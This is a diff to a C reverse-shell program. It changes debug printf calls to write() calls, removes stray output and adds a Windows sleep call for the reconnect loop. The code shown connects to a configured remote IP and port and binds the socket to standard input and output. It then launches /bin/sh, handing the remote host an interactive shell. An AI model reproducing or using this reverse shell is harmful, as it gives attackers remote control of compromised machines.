@@ -23,14 +23,14 @@
 
 int main(void) {
 #if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
-	printf("[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n");
+	write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
 	return (1);
 #endif
 
 #ifdef WIN32
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
-		printf("[ERROR] WSASturtup failed.\n");
+		write(2, "[ERROR] WSASturtup failed.\n", 28);
 		return (1);
 	}
 #endif
@@ -43,18 +43,21 @@ int main(void) {
 #else
 	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 #endif
-	printf("socket fd: %d\n", sockt);
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
 	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
 
 #ifdef WAIT_FOR_CLIENT
 	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+# ifndef WIN32
 		sleep(5);
+# else
+		Sleep(5000);
+# endif
 	}
 #else
 	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
-		printf("[ERROR] connect failed.\n");
+		write(2, "[ERROR] connect failed.\n", 24);
 		return (1);
 	}
 #endif
@@ -63,8 +66,6 @@ int main(void) {
 	dup2(sockt, 0);
 	dup2(sockt, 1);
 	dup2(sockt, 2);
-
-	printf("LINUX\n");
 	char * const argv[] = {"/bin/sh", NULL};
 	execve("/bin/sh", argv, NULL);
 #else
